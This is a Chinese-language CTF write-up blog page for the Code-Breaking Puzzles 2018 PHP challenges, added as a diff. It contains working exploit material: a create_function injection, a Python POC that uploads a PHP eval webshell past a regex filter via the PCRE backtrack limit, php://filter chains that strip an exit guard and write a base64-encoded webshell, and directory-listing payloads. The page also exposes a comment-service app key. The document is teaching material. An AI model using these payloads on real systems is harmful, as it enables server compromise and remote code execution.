@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="author" content="FengHLZ">
+  
+  
+  <title>Code-Breaking Puzzles 2018 做题记录 | xyz|All</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CTF,">
+  
+
+  
+  <meta name="description" content="P神的Code-Breaking Puzzles 2018 全都是好题目。项目地址：https://github.com/phith0n/code-breaking">
+
+  
+
+  <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"mB9CftyvuDc5gN6R44KukJtw-gzGzoHsz","appkey":"gRRwrnOXHglzMIz3blENWVJV","comment":true,"count":true},
+    welcome: {"enable":true,"interval":30},
+    start_time: "2018-07-09",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "FengHLZ",
+    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
+    mathjax: true,
+    page_type: ""
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+<script src="/js/jquery.min.js"></script>
+
+  
+    <link rel="icon" href="/images/siteimage.jpg">
+    <link rel="apple-touch-icon" href="/images/siteimage.jpg">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">FengHLZ.xyz</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Know it - Do it</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/index.html" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/FengHLZ" target="_blank">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-02-23
+    </span>
+    
+      <span>
+        | <a href="/categories/CTF/"><i class="fa fa-bookmark"></i>CTF</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    Code-Breaking Puzzles 2018 做题记录
+  </h1>
+  
+  <article class="passage-article">
+    <h2 id="一-easy-–-function"><a href="#一-easy-–-function" class="headerlink" title="一. easy – function"></a>一. easy – function</h2><p>源码审计：<br><img src="./1-1.png" alt></p>
+<p>思路很清晰，想办法在函数名的头或者尾找一个字符，不影响函数调用。<br>可以使用burpsuite来fuzz。</p>
+<p><strong>知识点一</strong>：<br>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名<code>function_name()</code>调用，调用的时候其实<code>相当于写了一个相对路径</code>；而如果写<code>\function_name()</code> 这样调用函数，则<code>其实是写了一个绝对路径</code>。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+<p>接下来就是要找到一个神奇的可控的函数。<br><strong>知识点二</strong>：<br>可以用<code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。<br>函数结构形似：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后执行，如果我们想要执行任意代码，<code>就首先需要跳出这个函数定义</code>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reate_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111;&#125;phpinfo();//'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>利用payload如下<br><img src="./1-2.png" alt></p>
+<p><strong>长姿势</strong>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$handler=opendir(<span class="string">'../'</span>);</span><br><span class="line"><span class="keyword">while</span>(($filename=readdir($handler))!==<span class="keyword">false</span>)</span><br><span class="line">    &#123;<span class="keyword">echo</span> $filename.<span class="string">"&lt;br/&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>利用上述php代码可以<strong>遍历服务器中某一目录的文件</strong>。</p>
+<h2 id="二-easy-–-pcrewaf"><a href="#二-easy-–-pcrewaf" class="headerlink" title="二. easy – pcrewaf"></a>二. easy – pcrewaf</h2><p><strong>PHP利用PCRE回溯次数限制绕过某些安全限制</strong></p>
+<p>源码审计：<br><img src="./2-1.png" alt></p>
+<p>看了WP后，实在是长姿势，偷偷记下来。(带水印的图片均来自P神的原图)</p>
+<h3 id="2-1-正则表达式介绍"><a href="#2-1-正则表达式介绍" class="headerlink" title="2.1 正则表达式介绍"></a>2.1 正则表达式介绍</h3><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p>
+<p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。而常见的正则引擎，又被细分为<strong>DFA</strong>（确定性有限状态自动机）与<strong>NFA</strong>（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p>
+<ul>
+<li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p>
+</li>
+<li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。<strong>大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</strong></p>
+</li>
+</ul>
+<h3 id="2-2-NFA执行的回溯过程"><a href="#2-2-NFA执行的回溯过程" class="headerlink" title="2.2 NFA执行的回溯过程"></a>2.2 NFA执行的回溯过程</h3><p>所以，我们题目中的正则<code>&lt;\?.*[(`;?&gt;].*</code>，假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>,实际执行流程是这样的：<br><img src="./2-2.png" alt></p>
+<p>（正则表达式在线调试：<a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a> ）<br>（正则表达式查找手册：<a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">http://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a> ）</p>
+<p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符<code>[(`;?&gt;]</code>。</p>
+<p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p>
+<p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(`;?&gt;]</code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配<code>;</code>，14步匹配<code>.*</code>，第二个<code>.*</code>匹配到了字符串末尾，最后结束匹配。</p>
+<h3 id="2-3-PHP的pcre-backtrack-limit限制利用"><a href="#2-3-PHP的pcre-backtrack-limit限制利用" class="headerlink" title="2.3 PHP的pcre.backtrack_limit限制利用"></a>2.3 PHP的pcre.backtrack_limit限制利用</h3><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：<br><img src="./2-3.png" alt></p>
+<p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：<br><img src="./2-4.png" alt></p>
+<p>可见，preg_match返回的非1和0，而是false。</p>
+<p>所以本题的POC为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://47.112.16.34:8071/'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.headers)  <span class="comment">#响应头显示文件位置</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-4-FILES全局变量介绍及用法"><a href="#2-4-FILES全局变量介绍及用法" class="headerlink" title="2.4 $_FILES全局变量介绍及用法"></a>2.4 $_FILES全局变量介绍及用法</h3><p>此数组包含有所有上传的文件信息。<br>看一个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The data encoding type, enctype, MUST be specified <span class="keyword">as</span> below --&gt;</span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"__URL__"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    &lt;!-- MAX_FILE_SIZE must precede the file input field --&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"30000"</span> /&gt;</span><br><span class="line">    &lt;!-- Name of input element determines name in $_FILES <span class="keyword">array</span> --&gt;</span><br><span class="line">    Send this file: &lt;input name=<span class="string">"userfile"</span> type=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Send File"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Note:<br>要确保文件上传表单的属性是 enctype=”multipart/form-data”，否则文件上传不了。 </p>
+</blockquote>
+<p>MAX_FILE_SIZE 隐藏字段（单位为字节）必须放在文件输入字段之前，其值为接收文件的最大尺寸。这是对浏览器的一个建议，PHP 也会检查此项。</p>
+<p>以上范例中 $_FILES 数组的内容如下所示。我们假设文件上传字段的名称如上例所示，为 userfile。名称可随意命名。</p>
+<p>$_FILES[‘userfile’][‘name’]</p>
+<blockquote>
+<p>客户端机器文件的原名称。</p>
+</blockquote>
+<p>$_FILES[‘userfile’][‘type’]</p>
+<blockquote>
+<p>文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image/gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。</p>
+</blockquote>
+<p>$_FILES[‘userfile’][‘size’]</p>
+<blockquote>
+<p>已上传文件的大小，单位为字节。</p>
+</blockquote>
+<p>$_FILES[‘userfile’][‘tmp_name’]</p>
+<blockquote>
+<p>文件被上传后在服务端储存的临时文件名。</p>
+</blockquote>
+<p>$_FILES[‘userfile’][‘error’]</p>
+<blockquote>
+<p>和该文件上传相关的错误代码。此项目是在 PHP 4.2.0 版本中增加的。</p>
+</blockquote>
+<h3 id="2-5-requests模块中POST一个多部分编码-Multipart-Encoded-的文件"><a href="#2-5-requests模块中POST一个多部分编码-Multipart-Encoded-的文件" class="headerlink" title="2.5 requests模块中POST一个多部分编码(Multipart-Encoded)的文件"></a>2.5 requests模块中POST一个多部分编码(Multipart-Encoded)的文件</h3><p>Requests 使得上传多部分编码文件变得很简单：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以显式地设置文件名，文件类型和请求头：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.xls'</span>, open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>), <span class="string">'application/vnd.ms-excel'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>也可以发送作为文件来接收的字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.csv'</span>, <span class="string">'some,data,to,send\nanother,row,to,send\n'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"some,data,to,send\\nanother,row,to,send\\n"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><del>全文参考</del>：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
+<h2 id="三-easy-phpmagic"><a href="#三-easy-phpmagic" class="headerlink" title="三. easy - phpmagic"></a>三. easy - phpmagic</h2><h3 id="3-1-php-filter的妙用"><a href="#3-1-php-filter的妙用" class="headerlink" title="3.1 php://filter的妙用"></a>3.1 php://filter的妙用</h3><p>P神的博客干货真多！<del>全程参考</del>：<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><strong>php://filter</strong>是PHP中独有的协议，利用这个协议可以创造很多“妙用”。</p>
+<h4 id="3-1-1-XXE中的利用"><a href="#3-1-1-XXE中的利用" class="headerlink" title="3.1.1 XXE中的利用"></a>3.1.1 XXE中的利用</h4><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
+<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
+<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
+<p>readfile(“php://filter/read=convert.base64-encode/resource=php://input”);</p>
+<p>如下：<br><img src="./3-1.png" alt><br><strong>php://filter/read=convert.base64-encode/resource=php://input</strong></p>
+<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。<br>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code><br><img src="./3-2.png" alt><br><strong>php://filter/read=convert.base64-encode/resource=./xxe.php</strong></p>
+<h4 id="3-1-2-巧用编码与解码"><a href="#3-1-2-巧用编码与解码" class="headerlink" title="3.1.2 巧用编码与解码"></a>3.1.2 巧用编码与解码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br></pre></td></tr></table></figure>
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上<code>if(!defined(xxx))exit;</code>之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？<br>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是<strong>可以控制协议的</strong>，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。<br>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code> <code>?</code> <code>;</code> <code>&gt;</code> <code>空格</code>等不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p>最后效果是 ：<br><img src="./3-3.png" alt><br><strong>php://filter/write=convert.base64-decode/resource=shell.php</strong></p>
+<h4 id="3-1-3-利用字符串操作方法"><a href="#3-1-3-利用字符串操作方法" class="headerlink" title="3.1.3 利用字符串操作方法"></a>3.1.3 利用字符串操作方法</h4><p>除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？<br>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 <code>php://filter/read=string.strip_tags/resource=php://input</code> 的效果：</p>
+<p><code>echo readfile(&#39;php://filter/read=string.strip_tags/resource=php://input&#39;);</code><br><img src="./3-4.png" alt><br><strong>php://filter/read=string.strip_tags/resource=php://input</strong></p>
+<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
+<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>最终的数据包如下：<br><img src="./3-5.png" alt><br><strong>php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</strong></p>
+<p>综上，我们得出，<strong>只要是传filename的地方，基本都可以传协议流。</strong></p>
+<h3 id="3-2-后缀名后加上-，pathinfo就取不到后缀名，且可以正常写入-php之中。"><a href="#3-2-后缀名后加上-，pathinfo就取不到后缀名，且可以正常写入-php之中。" class="headerlink" title="3.2 后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。"></a>3.2 后缀名后加上<code>/.</code>，pathinfo就取不到后缀名，且可以正常写入.php之中。</h3><p>这确实很实用，原理性介绍参考（先给自己挖个坑）： <a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>
+<h3 id="3-3-SERVER-‘SERVER-NAME’-函数"><a href="#3-3-SERVER-‘SERVER-NAME’-函数" class="headerlink" title="3.3 $_SERVER[‘SERVER_NAME’] 函数"></a>3.3 $_SERVER[‘SERVER_NAME’] 函数</h3><p>查看一下官方手册：<br><img src="./servername.png" alt></p>
+<p>注意 note 部分，这个值可以被伪造：<br>它的值取的是HTTP headers中的<code>Host</code>的值。</p>
+<h3 id="3-4-利用-base64-编码和解码写入shell"><a href="#3-4-利用-base64-编码和解码写入shell" class="headerlink" title="3.4 利用 base64 编码和解码写入shell"></a>3.4 利用 base64 编码和解码写入shell</h3><p>利用一个PHP伪协议base64解码的trick：<strong>解码中遇到不符合规范的字符直接跳过</strong>。</p>
+<p>另外因为base64解码是4位一组来解，所以我们要保证我们需要解码的字符串之前的合法字符数为4的倍数，这样就不会影响我们传入的字符串正常解码。测试一下：<br><img src="./burp.png" alt></p>
+<p>在传入的字符前，符合base64规范的字符是：</p>
+<blockquote>
+<p>ltltgtgtDiG9959deb8u15DebianltltgtgttAq </p>
+</blockquote>
+<p>40位长，不需要再添加其他字符。（<strong>注意</strong>：base64中的<code>=</code>只能出现在最末尾，而我们插入的字符串是在<code>中间</code>的，所以我们插入的字符串里不能有=。）</p>
+<p>getshell: <code>&lt;?php eval($_REQUEST[&#39;cmd&#39;]);//?&gt;</code><br>base64: <code>PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsvLz8+</code></p>
+<p>写入：<br><img src="./uploadshell.png" alt></p>
+<p>至此，getshell成功。</p>
+<h2 id="四-easy-phplimit"><a href="#四-easy-phplimit" class="headerlink" title="四. easy - phplimit"></a>四. easy - phplimit</h2><p>题目描述：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>ps:他们说这题最早出现是在RCTF2018中<br><a href="https://lorexxar.cn/2018/05/23/rctf2018/" target="_blank" rel="noopener">https://lorexxar.cn/2018/05/23/rctf2018/</a><br>在原来的题目中是用next(getallheaders())绕过这个限制的。但这里 <code>getallheaders</code> 是 apache 中的函数，这里是 nginx 环境。<br><del>先挖个坑，再慢慢看。</del></p>
+<h3 id="4-1-正则-R-介绍"><a href="#4-1-正则-R-介绍" class="headerlink" title="4.1 正则 (?R) 介绍"></a>4.1 正则 (?R) 介绍</h3><p>第一次看到这样的正则式的时候，有点懵逼。还是需要调试理解：<br><img src="./4-1.png" alt></p>
+<p>可以知道，<code>(?R)</code><strong>可以递归整个模式</strong><br>具体到这个问题，<code>preg_replace</code> 返回替换后的字符串；<br><code>$_GET[&#39;code&#39;]</code> 的值为一个函数，但是不能带任何参数；<br>函数的括号里面又可以是一个函数： <code>dirname(getcwd())</code></p>
+<h3 id="4-2-技巧一：使用-get-defined-vars-函数"><a href="#4-2-技巧一：使用-get-defined-vars-函数" class="headerlink" title="4.2 技巧一：使用 get_defined_vars 函数"></a>4.2 技巧一：使用 <code>get_defined_vars</code> 函数</h3><blockquote>
+<p>get_defined_vars — 返回由所有已定义变量所组成的数组 </p>
+</blockquote>
+<p>包括全局变量GET等.</p>
+<h4 id="4-2-1-利用重点：-直接reset所有的变量"><a href="#4-2-1-利用重点：-直接reset所有的变量" class="headerlink" title="4.2.1 利用重点： 直接reset所有的变量"></a>4.2.1 利用重点： 直接reset所有的变量</h4><ul>
+<li>调试过程可以借助 <code>print_r()</code> 函数查看输出结果；<br>  <img src="./4-2.png" alt></li>
+<li>reset 所有变量<br>  <img src="./4-3.png" alt></li>
+<li>在新的数组里加入一个新变量 <code>1</code><br>  <img src="./4-4.png" alt></li>
+<li><code>implode()</code> 函数将它们连接成一个字符串。注意，<strong>第一个变量后的东西全部注释掉</strong><br>  <img src="./4-5.png" alt></li>
+<li><code>eval</code> 函数执行这个字符串<br>  <img src="./4-6.png" alt></li>
+<li>接下来，只要控制 1 这个变量的值就可以了<br>  <img src="./4-7.png" alt></li>
+</ul>
+<h3 id="4-2-直接列目录"><a href="#4-2-直接列目录" class="headerlink" title="4.2 直接列目录"></a>4.2 直接列目录</h3><blockquote>
+<p>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</p>
+</blockquote>
+<h2 id="五-easy-nodechr"><a href="#五-easy-nodechr" class="headerlink" title="五. easy - nodechr"></a>五. easy - nodechr</h2><p>后台是 <code>nodejs</code> 写的，再感受下 <code>Unicode</code> 编码和 <code>JS</code> 的黑魔法。<br>关键代码：</p>
